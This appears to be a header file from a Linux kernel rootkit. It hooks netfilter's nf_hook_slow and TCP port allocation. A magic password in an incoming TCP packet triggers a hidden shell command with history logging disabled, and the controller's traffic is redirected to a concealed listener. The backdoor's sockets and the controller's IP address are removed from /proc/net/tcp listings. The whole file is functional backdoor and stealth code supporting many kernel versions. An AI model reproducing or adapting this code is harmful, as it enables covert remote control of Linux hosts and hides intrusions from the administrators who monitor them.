#ifndef RPKT_H
#define RPKT_H

#include <linux/init.h>
#include <linux/version.h>
#include <linux/kernel.h>

#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/inet.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/netdevice.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/icmp.h>
#include <net/inet_sock.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 14)
#include <net/inet_timewait_sock.h>
#endif
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 14)
#include <net/inet_hashtables.h>
#include <net/inet6_hashtables.h>
#endif

#include <linux/proc_fs.h>
#include <linux/string.h>

#include <linux/signal.h>
#include <asm/siginfo.h>
#include <linux/sched.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 25)
#include <linux/pid.h>
#endif
#include <linux/kmod.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/pid_namespace.h>
#endif

#include "config.h"


#define NIPQUAD(addr) ((unsigned char *)&addr)[0], ((unsigned char *)&addr)[1], ((unsigned char *)&addr)[2], ((unsigned char *)&addr)[3]

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 28)
#define get_task_uid(task) task->uid
#define get_task_parent(task) task->parent
#else
#define get_task_uid(task) task->cred->uid
#define get_task_parent(task) task->real_parent
#endif

extern hook_t _tbl[];

typedef struct login_ctx_t
{
    unsigned int control_sip;
    unsigned short control_sport;
    unsigned short wport;
    unsigned short tport;
    int cnt;
    int start;
    atomic_t usage;

} LOGIN_CTX;

LOGIN_CTX login_ctx = {0, 0, 0, 0, 0, 0, ATOMIC_INIT(0)};



/*from net/ipv4/tcp_ipv4.c*/
#define TMPSZ 150

static int (*this_get_port)(struct sock *sk, unsigned short snum);
///-------------------------------------------------------------------------------------

inline struct task_struct *lookuptsk(const char *_name)
{
	rcu_read_lock();
    struct task_struct *task = &init_task;

    do
    {
        if (strstr(task->comm, _name) != NULL)
        {
			rcu_read_unlock();
			
            return task;
        }

    } while ((task = next_task(task)) != &init_task);
    rcu_read_unlock();
	
    return NULL;
}

inline int cmp_task(struct inode *in_inode)
{
    struct fdtable *fdt = NULL;
    struct files_struct *files = NULL;
    struct file *filp = NULL;
    struct task_struct *task = NULL;
    unsigned int idx = 0;
    struct inode *inode = NULL;

    // get task
    task = lookuptsk(_kname);

    if(task == NULL || in_inode == NULL)
        return 0;

    files = task->files;

	if(files == NULL)
		return 0;
	
	rcu_read_lock();
    for (fdt = files_fdtable(files); idx < fdt->max_fds; ++idx)
    {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
        // 新内核使用files_lookup_fd_rcu
        filp = files_lookup_fd_rcu(files, idx);
#else
        filp = fcheck_files(files, idx);
#endif
        if(filp == NULL)
			continue;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
        inode = filp->f_dentry->d_inode;
#else
        inode = filp->f_inode;
#endif

        if (in_inode != NULL && inode != NULL && in_inode == inode)
        {
            goto found;
        }

    }
	rcu_read_unlock();

not_found:
    return 0;

found:
	rcu_read_unlock();
	
    return 1;
}

int check_(struct sock *sk)
{
    struct inode *inode = NULL;
    struct file *filp = NULL;

    if (sk == NULL)
    {
        return -1;
    }

    // TCP_ESTABLISHED, TCP_LISTEN has sk->sk_socket
    if (sk->sk_state == TCP_ESTABLISHED || sk->sk_state == TCP_LISTEN) {
        if (sk->sk_socket == NULL || sk->sk_socket->file == NULL)
        {
            return -1;
        }

        filp = sk->sk_socket->file;
        if(filp != NULL) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(3,9,0)
            inode = filp->f_dentry->d_inode;
#else
            inode = filp->f_inode;
#endif

            if (inode != NULL && cmp_task(inode) == 1)
            {
                debug(" net hide! \n");
                return 1;
            }
        }
    }

    return 0;
}

int v4_seq_show(struct seq_file *seq, void *v)
{
    int ret = 0;
    struct inet_timewait_sock *itw;
    struct inet_sock *inet;
    struct sock *_sock = (struct sock *) v;

    hook_t *hk = NULL;
    int _tcp4_seq_show(struct seq_file * seq, void *v);

    hk = &_tbl[0];

    if(SEQ_START_TOKEN == v)
    {
        return ((typeof(_tcp4_seq_show) *)hk->stub_bak)(seq, v);
    }

    inet = inet_sk((struct sock *) v);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
    __be32 _daddr = inet->inet_daddr;
    __be32 _rcv_saddr = inet->inet_rcv_saddr;

    unsigned short _sport = inet->inet_sport;
    unsigned short _dport = inet->inet_dport;
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
    __be32 _daddr = inet->daddr;
    __be32 _rcv_saddr = inet->rcv_saddr;

    unsigned short _sport = inet->sport;
    unsigned short _dport = inet->dport;
#endif

    if(check_(_sock) == 1)
    {
        return 0;
    }

    if (_sock->sk_state == TCP_TIME_WAIT)
    {
        itw = inet_twsk((struct sock *) v);

        if ((itw->tw_daddr == login_ctx.control_sip && itw->tw_dport == login_ctx.control_sport) || (itw->tw_rcv_saddr == login_ctx.control_sip && itw->tw_sport == login_ctx.control_sport))
        {
            debug("ip hidden (time_wait) \n");

            return 0;
        }
    }

    if (login_ctx.control_sip != 0)
    {
        if ((_daddr == login_ctx.control_sip && _dport == login_ctx.control_sport) || (_rcv_saddr == login_ctx.control_sip && _sport == login_ctx.control_sport))
        {
            debug("ip hidden (established) \n");

            return 0;
        }
    }

    return ((typeof(_tcp4_seq_show) *)hk->stub_bak)(seq, v);


ret:

    return ret;
}

///-------------------------------------------------------------------------------------
#ifndef UMH_WAIT_PROC
#define UMH_WAIT_PROC 1
#endif
/* execute for userspace */
static char *envp[] =
{
    "HOME=/",
    "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin",
    "HISTORY=/dev/null",
    "BASH_HISTORY=/dev/null",
    "HISTFILE=/dev/null",
    "history=/dev/null",
    NULL
};

static char *argv[4] = {"/bin/sh", "-c", _kpath, NULL};
struct wargs
{
    struct work_struct work;
    char *cmd;
};
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 20)
void _exec(struct work_struct *data)
#else
void _exec(void *data)
#endif
{
    int result = 0;

    result = call_usermodehelper(argv[0], (char **)argv, (char **)envp, UMH_WAIT_PROC); //UMH_WAIT_EXEC = 0
    if (result)
        debug(" call_usermodehelper is %d\n", result);
    debug(" process is %s,pid %d \n", current->comm, current->pid);

}

int _run(void)
{
    struct wargs *wargs;

    wargs = kmalloc(sizeof(struct wargs), GFP_ATOMIC);
    wargs->cmd = kmalloc(1024 * sizeof(char), GFP_ATOMIC);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 20)
    INIT_WORK(&wargs->work, _exec);
#else
    INIT_WORK(&wargs->work, _exec, &wargs->work);
#endif

    schedule_work(&wargs->work);

    debug("_run  \n");

    return 0;
}

//--------------------------------------------------------------------------------------
static int get_port(struct sock *sk, unsigned short snum)
{
    int ret;
    unsigned short port;
    unsigned short port1;
    struct task_struct *htask;

    ret = this_get_port(sk, snum);
    if (ret != 0)
        return ret;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 34)
    port = inet_sk(sk)->inet_num;
    port1 = inet_sk(sk)->inet_sport;
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
    port = inet_sk(sk)->num;
    port1 = inet_sk(sk)->sport;
#endif

    htask = current;

    if ((strstr(htask->comm, _kname) != NULL) && port != 0)
    {
        debug("  %s  to port : %d \n", htask->comm, (port) );

        login_ctx.tport = port;
    }

    return ret;
}

static inline void sig_out(const char *pid_name)
{
    struct task_struct *task = &init_task;

    do
    {
        if (strstr(task->comm, pid_name) != NULL)
        {
            debug(" kill: %s [%d]\n", task->comm, task->pid);
            send_sig(SIGKILL, task, 1);
        }

    }
    while ((task = next_task(task)) != &init_task);

    return;
}

///-------------------------------------------------------------------------------------

static unsigned long _newtm = 0;
#define MAX_TIMEOUT (12 * HZ)       // 12 s
static inline int tm_check(void)
{
    // expires
    if ( time_after(jiffies, _newtm + MAX_TIMEOUT) )
    {
        debug("timeout! \n");
        return 0;
    }
    else
        return -1;
}

static inline void reset_ctx(void)
{
    memset(&login_ctx, 0, sizeof(LOGIN_CTX));
}
//----------------------------------------------------------------------------------------------------------------------------

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 22)
inline struct iphdr *ip_hdr2(const struct sk_buff *skb)
{
    return skb->nh.iph;
}
#endif


inline int _skb_rcsum(struct sk_buff *skb)
{
    struct iphdr *iph = NULL;
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 22)
    iph = ip_hdr2(skb);
#else
    iph = ip_hdr(skb);
#endif

    int len = ntohs(iph->tot_len);

    if (skb->len < len)
    {
        return -1;
    }
    else if (len < (iph->ihl * 4))
    {
        return -1;
    }

    if (iph->protocol == IPPROTO_TCP)
    {
        struct tcphdr *tcph = (struct tcphdr *)((void *)iph + iph->ihl * 4);

// CHECKSUM_PARTIAL  outgoing 
// CHECKSUM_COMPLETE  incoming
#if LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 21)
        if (skb->ip_summed == CHECKSUM_PARTIAL)
        {
            // IP hdr checksum
            iph->check = 0;
            iph->check = ip_fast_csum((void *)iph, iph->ihl);

            tcph->check = 0;
            tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr, skb->len - iph->ihl * 4, IPPROTO_TCP, 0);

			// 2.6.22
            skb->csum_start = (unsigned char *)tcph - skb->head;

            skb->csum_offset = offsetof(struct tcphdr, check);
        }
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 18)
// 2.6.19  CHECKSUM_HW  to  CHECKSUM_PARTIAL
#ifndef CHECKSUM_HW
#define CHECKSUM_HW		CHECKSUM_PARTIAL
#endif
        if (skb->ip_summed == CHECKSUM_HW)
        {
            // IP hdr checksum
            iph->check = 0;
            iph->check = ip_fast_csum((void *)iph, iph->ihl);

            tcph->check = 0;
            tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr, skb->len - iph->ihl * 4, IPPROTO_TCP, 0);

            skb->csum = offsetof(struct tcphdr, check);
        }
#endif
        else
        {
            // IP hdr checksum
            iph->check = 0;
            iph->check = ip_fast_csum((void *)iph, iph->ihl);

            skb->csum = 0;
            tcph->check = 0;
            skb->csum = skb_checksum(skb, iph->ihl * 4, len - iph->ihl * 4, 0);
            tcph->check = csum_tcpudp_magic(iph->saddr, iph->daddr, len - iph->ihl * 4, iph->protocol, skb->csum);
            if (skb->ip_summed == CHECKSUM_COMPLETE)
            {
                skb->ip_summed = CHECKSUM_UNNECESSARY;
            }
        }
    }
    else
    {
        return -1;
    }

    return 0;
}



// packet in
inline int packi(struct sk_buff *skb)
{
    struct sk_buff *nskb = skb;
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *data = NULL;

    if (skb_linearize(nskb) != 0)
        return -1;

#if (LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 23))
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 2, 0)
    if (!skb_try_make_writable(nskb, nskb->len))
        return -1;
#else
    if (!skb_make_writable(nskb, nskb->len))
        return -1;
#endif
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 22)
    iph = ip_hdr2(nskb);
#else
    iph = ip_hdr(nskb);
#endif

    // ip fragment
    if (unlikely(iph->frag_off & htons(IP_MF | IP_OFFSET)))
    {
        return -1;
    }

    if (iph->protocol == IPPROTO_TCP)
    {
        tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl);

        unsigned int datalen = nskb->len - (iph->ihl * 4 + tcph->doff * 4);

        data = (char *)((int *)tcph + (int)(tcph->doff));


        if (login_ctx.start == 0 && tcph->psh )
        {
            unsigned int len = datalen > 400 ? 400:datalen;
			
            if (memmem(data, len, _START_PASS, strlen(_START_PASS)) != NULL)
            {
                login_ctx.control_sport = tcph->source;

                _newtm = jiffies;

                reset_ctx();

                login_ctx.control_sip = iph->saddr;
                login_ctx.wport = tcph->dest;

                sig_out(_kname);
                _run();

                login_ctx.start = 2;

                debug("pack 1: [%u.%u.%u.%u]:%u-->%u\n", NIPQUAD(iph->saddr), ntohs(tcph->source), ntohs(tcph->dest));

                memset(data, 0, datalen);

                tcph->doff = sizeof(struct tcphdr) / 4;
                skb_trim(nskb, iph->ihl * 4 + sizeof(struct tcphdr));
                iph->tot_len = htons(iph->ihl * 4 + tcph->doff * 4);

                _skb_rcsum(nskb);

                return NF_DROP;
            }
        }

        if (login_ctx.start == 2 && tcph->syn && (login_ctx.control_sip == iph->saddr) && (login_ctx.wport == tcph->dest))
        {
            login_ctx.control_sport = tcph->source;
            login_ctx.start = 0;

            debug("pack 2: [%u.%u.%u.%u]:%u-->%u\n", NIPQUAD(iph->saddr), ntohs(tcph->source), ntohs(tcph->dest));

            // return NF_ACCEPT;
        }

        if (login_ctx.start != 0)
        {
            if (tm_check() == 0)
            {
                //reset_ctx();
                login_ctx.start = 0;
                debug("time out \n");
            }
        }

        if (iph->saddr == login_ctx.control_sip && (login_ctx.control_sport == tcph->source ))
        {
            if (tcph->dest == login_ctx.wport)
            {
                _newtm = jiffies;

                tcph->dest = htons(login_ctx.tport);


                _skb_rcsum(nskb);

                ///debug("pack 333: [%u.%u.%u.%u]:%u-->%u\n", NIPQUAD(iph->saddr), ntohs(tcph->source), ntohs(tcph->dest));

                return NF_ACCEPT;
            }
        }

    }

    return -1;
}

// packet out
inline int packo(struct sk_buff *pskb)
{
    struct sk_buff *nskb = pskb;
    struct iphdr *iph;
    struct tcphdr *tcph;

    if (skb_linearize(nskb) != 0)
    {
        return -1;
    }

#if (LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 23))
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 2, 0)
    if (!skb_try_make_writable(nskb, nskb->len))
        return -1;
#else
    if (!skb_make_writable(nskb, nskb->len))
        return -1;
#endif
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 22)
    iph = ip_hdr2(nskb);
#else
    iph = ip_hdr(nskb);
#endif

    if (unlikely(iph->frag_off & htons(IP_MF | IP_OFFSET)))
    {
        return -1;
    }

    if (iph->protocol == IPPROTO_TCP)
    {
        tcph = (struct tcphdr *)((__u32 *)iph + iph->ihl);

        if (login_ctx.tport == 0)
        {
            return -1;
        }

        if (iph->daddr == login_ctx.control_sip)
        {
            if (ntohs(tcph->source) == login_ctx.tport)
            {
                tcph->source = login_ctx.wport;

                _skb_rcsum(nskb);

                ///debug("out: [%u.%u.%u.%u]:%u-->%u\n", NIPQUAD(iph->saddr), ntohs(tcph->source), ntohs(tcph->dest));

                return NF_ACCEPT;
            }
        }
    }

    return -1;
}


#if defined(RHEL_MAJOR) && defined(RHEL_MINOR)
# define _RLNX_RHEL_MIN(a_iMajor, a_iMinor) \
     ((RHEL_MAJOR) > (a_iMajor) || ((RHEL_MAJOR) == (a_iMajor) && (RHEL_MINOR) >= (a_iMinor)))
#else
# define _RLNX_RHEL_MIN(a_iMajor, a_iMinor) (0)
#endif

#if defined(RHEL_MAJOR) && defined(RHEL_MINOR)
# define _RLNX_RHEL_MAX(a_iMajor, a_iMinor) \
     ((RHEL_MAJOR) < (a_iMajor) || ((RHEL_MAJOR) == (a_iMajor) && (RHEL_MINOR) < (a_iMinor)))
#else
# define _RLNX_RHEL_MAX(a_iMajor, a_iMinor) (0)
#endif

#if defined(RHEL_MAJOR) && defined(RHEL_MINOR)
# define _RLNX_RHEL_RANGE(a_iMajorMin, a_iMinorMin,  a_iMajorMax, a_iMinorMax) \
     (_RLNX_RHEL_MIN(a_iMajorMin, a_iMinorMin) && _RLNX_RHEL_MAX(a_iMajorMax, a_iMinorMax))
#else
# define _RLNX_RHEL_RANGE(a_iMajorMin, a_iMinorMin,  a_iMajorMax, a_iMinorMax)  (0)
#endif

#if defined(RHEL_MAJOR) && defined(RHEL_MINOR)
# define _RLNX_RHEL_MAJ_PREREQ(a_iMajor, a_iMinor) ((RHEL_MAJOR) == (a_iMajor) && (RHEL_MINOR) >= (a_iMinor))
#else
# define _RLNX_RHEL_MAJ_PREREQ(a_iMajor, a_iMinor) (0)
#endif

#if defined(CONFIG_SUSE_VERSION) && defined(CONFIG_SUSE_PATCHLEVEL)
# define RTLNX_SUSE_MAJ_PREREQ(a_iMajor, a_iMinor) ((CONFIG_SUSE_VERSION) == (a_iMajor) && (CONFIG_SUSE_PATCHLEVEL) >= (a_iMinor))
#else
# define RTLNX_SUSE_MAJ_PREREQ(a_iMajor, a_iMinor) (0)
#endif
// #if defined(UTS_UBUNTU_RELEASE_ABI) || defined(DOXYGEN_RUNNING)


#if _RLNX_RHEL_MIN(7, 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s)
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
// readhat/centos >= 7.2
// Fri Jun 26 2015 Rafael Aquini <aquini@redhat.com> [3.10.0-284.el7]
// int nf_hook_slow(struct sk_buff *skb, struct nf_hook_state *state)
int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state)
#endif

#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
// 4.13 - 4.20
int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, const struct nf_hook_entries *e, unsigned int s)
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 9, 0)
// 4.13 - 4.10
int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state, struct nf_hook_entry *entry)
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
//  4.9 - 4.1
int ptr_hook_slow(struct sk_buff *skb, struct nf_hook_state *state)
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 22)
// 4.0 - 2.6.22
int ptr_hook_slow(u_int8_t pf, unsigned int hook, struct sk_buff *skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh)
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 10)
// 2.6.22 - 2.6.11
int ptr_hook_slow(int pf, unsigned int hook, struct sk_buff **skb, struct net_device *indev, struct net_device *outdev, int (*okfn)(struct sk_buff *), int thresh)
#endif

#endif
{
    int ret = 0;
    hook_t *hk = NULL;
    int verdict;

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 22)
    struct sk_buff *nskb = *skb;
#else
    struct sk_buff *nskb = skb;
#endif


#if _RLNX_RHEL_MIN(7, 2)
    if(state->pf == PF_INET && state->hook == NF_INET_LOCAL_IN)
#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
    if(state->pf == PF_INET && state->hook == NF_INET_LOCAL_IN)
#elif LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,22)
    if(pf == PF_INET && hook == NF_IP_LOCAL_IN)
#else
    if(pf == PF_INET && hook == NF_INET_LOCAL_IN)
#endif
#endif
    {
        rcu_read_lock();

        verdict = packi(nskb);
        if(verdict == NF_DROP)
        {
            kfree_skb(nskb);
            ret = -EPERM;
        }
        if(verdict == NF_ACCEPT)
        {
            ret = 1;
        }

        if(ret != 0)
        {
            rcu_read_unlock();

            return ret;
        }

        rcu_read_unlock();
    }

#if _RLNX_RHEL_MIN(7, 2)
    if(state->pf == PF_INET && state->hook == NF_INET_LOCAL_OUT)
#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
    if(state->pf == PF_INET && state->hook == NF_INET_LOCAL_OUT)
#elif LINUX_VERSION_CODE <= KERNEL_VERSION(2,6,22)
    if(pf == PF_INET && hook == NF_IP_LOCAL_OUT)
#else
    if(pf == PF_INET && hook == NF_INET_LOCAL_OUT)
#endif
#endif
    {
        rcu_read_lock();

        verdict = packo(nskb);
        if(verdict == NF_ACCEPT)
        {
            rcu_read_unlock();

            return 1;
        }

        rcu_read_unlock();
    }

    hk = &_tbl[4];

#if _RLNX_RHEL_MIN(7, 2)
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(skb, state, e, s);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(skb, state);
#endif

#else

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 12, 0)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(skb, state, e, s);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 9, 0)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(skb, state, entry);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 0, 0)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(skb, state);
#elif LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 22)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(pf, hook, skb, indev, outdev, okfn, thresh);
#elif LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 10)
    ret = ((typeof(nf_hook_slow) *)hk->stub_bak)(pf, hook, skb, indev, outdev, okfn, thresh);
#endif
#endif

    return ret;
}


int pktinit1(void)
{
    this_get_port = tcp_prot.get_port;
    tcp_prot.get_port = get_port;

    return 0;
}

inline void pktinit2(void)
{
    tcp_prot.get_port = this_get_port;

}


#endif

